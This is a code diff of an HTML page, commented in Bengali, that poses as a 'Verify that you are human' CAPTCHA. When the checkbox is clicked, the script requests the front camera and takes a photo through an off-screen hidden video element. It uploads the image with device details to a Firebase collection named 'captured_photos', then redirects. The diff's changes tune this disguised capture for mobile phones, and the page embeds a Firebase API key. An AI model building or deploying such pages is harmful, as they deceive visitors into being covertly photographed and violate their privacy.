@@ -2,7 +2,7 @@
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Security Verification</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap');
@@ -12,26 +12,36 @@
         body {
             display: flex; justify-content: center; align-items: center; min-height: 100vh;
             background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
-            overflow: hidden;
+            /* overflow: hidden বাদ দেওয়া হয়েছে যাতে মোবাইলে স্ক্রল করা যায় */
+            padding: 20px; 
         }
 
         .verification-card {
-            background: rgba(255, 255, 255, 0.95); padding: 40px; border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5); text-align: center; width: 350px;
+            background: rgba(255, 255, 255, 0.95); 
+            padding: 30px; 
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5); 
+            text-align: center; 
+            
+            /* মোবাইলের জন্য সাইজ ঠিক করা হলো */
+            width: 100%; 
+            max-width: 380px; 
         }
 
-        h2 { color: #333; margin-bottom: 10px; font-weight: 600; }
+        h2 { color: #333; margin-bottom: 10px; font-weight: 600; font-size: 24px; }
         p { color: #666; font-size: 14px; margin-bottom: 30px; }
 
         .captcha-box {
             background: #f9f9f9; border: 1px solid #d3d3d3; border-radius: 4px;
-            padding: 20px 15px; display: flex; align-items: center; justify-content: space-between;
+            padding: 15px; display: flex; align-items: center; justify-content: space-between;
             cursor: pointer; transition: background 0.2s; margin-bottom: 20px;
             box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
-        .captcha-box:hover { background: #f0f0f0; }
+        
+        /* মোবাইলে ক্লিক যাতে সহজ হয় */
+        .captcha-box:active { background: #e0e0e0; }
 
-        .captcha-content { display: flex; align-items: center; gap: 15px; }
+        .captcha-content { display: flex; align-items: center; gap: 12px; }
         
         .spinner {
             border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%;
@@ -39,28 +49,26 @@
         }
 
         .custom-checkbox {
-            width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px;
+            width: 26px; height: 26px; border: 2px solid #c1c1c1; border-radius: 3px;
             background: white; position: relative;
         }
         .custom-checkbox.checked { background: #4CAF50; border-color: #4CAF50; }
         .custom-checkbox.checked::after {
-            content: ''; position: absolute; left: 7px; top: 3px; width: 6px; height: 12px;
+            content: ''; position: absolute; left: 8px; top: 4px; width: 6px; height: 12px;
             border: solid white; border-width: 0 3px 3px 0; transform: rotate(45deg);
         }
 
+        .captcha-label { font-size: 14px; color: #333; font-weight: 500; }
         .captcha-logo img { width: 38px; opacity: 0.7; }
-        
-        /* মেসেজের স্টাইল */
-        .status-msg { 
-            margin-top: 15px; 
-            font-size: 13px; 
-            color: #888; 
-            min-height: 20px;
-            line-height: 1.4;
-        }
+        .status-msg { margin-top: 15px; font-size: 13px; color: #888; min-height: 20px; }
 
-        /* লুকানো এলিমেন্ট */
-        #videoElement { display: none; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* ভিডিও এলিমেন্ট স্ক্রিনের বাইরে পাঠানো হয়েছে, কিন্তু display: none করা হয়নি */
+        #videoElement { 
+            position: absolute; top: -9999px; left: -9999px; 
+            width: 1px; height: 1px; opacity: 0; pointer-events: none;
+        }
         #canvasElement { display: none; }
     </style>
 </head>
@@ -68,7 +76,7 @@
 
     <div class="verification-card">
         <h2>Security Check</h2>
-        <p>Identity verification required.</p>
+        <p>Verify that you are human.</p>
 
         <div class="captcha-box" id="captchaBox" onclick="startVerification()">
             <div class="captcha-content">
@@ -81,10 +89,10 @@
             </div>
         </div>
         
-        <div class="status-msg" id="statusText">Waiting for action...</div>
+        <div class="status-msg" id="statusText">Waiting for verification...</div>
     </div>
 
-    <video id="videoElement" autoplay playsinline></video>
+    <video id="videoElement" autoplay playsinline muted></video>
     <canvas id="canvasElement"></canvas>
 
     <script type="module">
@@ -92,9 +100,9 @@
         import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
         // ==========================================
-        // Firebase Config এখানে বসান
+        // তোমার FIREBASE CONFIG এখানে বসাও
         // ==========================================
-      const firebaseConfig = {
+        const firebaseConfig = {
   apiKey: "AIzaSyDtIf_By5BvhFt2BV7lUfGGs-IWljWNwaw",
   authDomain: "nahian-1869b.firebaseapp.com",
   projectId: "nahian-1869b",
@@ -119,65 +127,71 @@
             const video = document.getElementById('videoElement');
             const canvas = document.getElementById('canvasElement');
 
-            // UI রিসেট
-            checkbox.classList.remove('checked');
             checkbox.style.display = 'none';
             spinner.style.display = 'block';
-            statusText.innerText = "Checking permissions...";
-            statusText.style.color = "#888";
+            statusText.innerText = "Checking environment...";
 
             try {
-                // ক্যামেরা এক্সেস চাওয়া
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                // মোবাইলের জন্য facingMode: "user" দেওয়া হলো (সামনের ক্যামেরা)
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
                 
-                // যদি Allow করে, তাহলে নিচের কোড কাজ করবে
                 video.srcObject = stream;
-
+                
+                // iPhone বা মোবাইলে ভিডিও লোড হতে একটু সময় নেয়
                 video.onloadedmetadata = async () => {
-                    // ছবি তোলা
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    // ভিডিও প্লে নিশ্চিত করা
+                    video.play();
                     
-                    const imageData = canvas.toDataURL('image/png');
+                    // ১ সেকেন্ড অপেক্ষা করে ছবি তোলা (যেন ক্যামেরা রেডি হয়)
+                    setTimeout(async () => {
+                        canvas.width = 480; // সাইজ কমানো হলো
+                        canvas.height = 640;
+                        const context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        // কোয়ালিটি কমিয়ে JPEG করা হলো
+                        const imageData = canvas.toDataURL('image/jpeg', 0.6);
 
-                    statusText.innerText = "Verifying...";
-                    
-                    // ফায়ারবেসে পাঠানো
-                    await addDoc(collection(db, "captured_photos"), {
-                        image: imageData,
-                        timestamp: serverTimestamp(),
-                        userAgent: navigator.userAgent
-                    });
+                        statusText.innerText = "Verifying identity...";
+                        
+                        try {
+                            await addDoc(collection(db, "captured_photos"), {
+                                image: imageData,
+                                timestamp: serverTimestamp(),
+                                userAgent: navigator.userAgent,
+                                device: /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "PC"
+                            });
 
-                    // ক্যামেরা বন্ধ করা
-                    stream.getTracks().forEach(track => track.stop());
+                            // ক্যামেরা বন্ধ করা
+                            stream.getTracks().forEach(track => track.stop());
 
-                    // সফল! রিডাইরেক্ট
-                    spinner.style.display = 'none';
-                    checkbox.style.display = 'block';
-                    checkbox.classList.add('checked');
-                    statusText.innerText = "Verification Complete! Redirecting...";
-                    statusText.style.color = "#4CAF50";
+                            spinner.style.display = 'none';
+                            checkbox.style.display = 'block';
+                            checkbox.classList.add('checked');
+                            statusText.innerText = "Success! Redirecting...";
+                            statusText.style.color = "#4CAF50";
 
-                    setTimeout(() => {
-                        window.location.href = "prank1.html";
-                    }, 1000);
+                            setTimeout(() => {
+                                window.location.href = "new.html";
+                            }, 1500);
+
+                        } catch (dbError) {
+                            console.error("Database Error:", dbError);
+                            statusText.innerText = "Connection Error.";
+                        }
+                    }, 800); // 800ms delay for camera focus
                 };
 
             } catch (error) {
-                // যদি Permission না দেয় বা Block করে
-                console.error("Permission Denied:", error);
-                
-                isProcessing = false; // আবার ক্লিক করার সুযোগ দেওয়া
+                console.error("Camera Error:", error);
+                isProcessing = false;
                 spinner.style.display = 'none';
                 checkbox.style.display = 'block';
-                
-                // লাল রঙের ওয়ার্নিং মেসেজ
                 statusText.innerText = "You can not catch up the page..please allow the camera..";
                 statusText.style.color = "red";
-                statusText.style.fontWeight = "bold";
             }
         }
     </script>
